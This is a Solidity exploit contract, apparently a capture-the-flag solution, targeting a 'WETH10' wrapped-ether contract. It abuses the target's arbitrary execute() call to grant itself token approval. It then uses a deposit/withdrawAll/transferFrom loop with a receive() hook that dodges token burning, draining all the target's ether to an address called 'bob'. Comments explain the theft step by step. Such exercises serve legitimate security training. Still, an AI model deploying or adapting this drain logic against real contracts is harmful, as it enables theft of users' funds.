pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// The Messi Wrapped Ether
interface IWETH10 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function withdrawAll() external;
    function execute(address, uint256, bytes calldata) external;
}

contract WETH10Attack {
    IWETH10 target;
    address bob;

    constructor(address _bob) payable {
        bob = _bob;
    }

    function attack(address _target) external {
        target = IWETH10(_target);
        target.execute(_target, 0, abi.encodeWithSignature("approve(address,uint256)", address(this), 999 ether));
        while (_target.balance > 0) {
            // ensure that we won't withdraw more that _target has
            uint256 amountToSteal =  address(this).balance < _target.balance ? address(this).balance : _target.balance;
            target.deposit{value: amountToSteal}();
            target.withdrawAll();
            target.transferFrom(_target, address(this), amountToSteal);
            target.withdrawAll();
        }
        (bool success,) = bob.call{value: address(this).balance}("");
        require(success, "Transfer failed.");
    }

    receive() external payable {
        /* 
        on receive we transfer back all WETH10 tokens to WETH10 contract
        so _burnAll() will burn 0 WETH10 tokens. Later we can get these
        tokens back because we have unlimited approval.
        */
        target.transfer(msg.sender, msg.value);
    }
}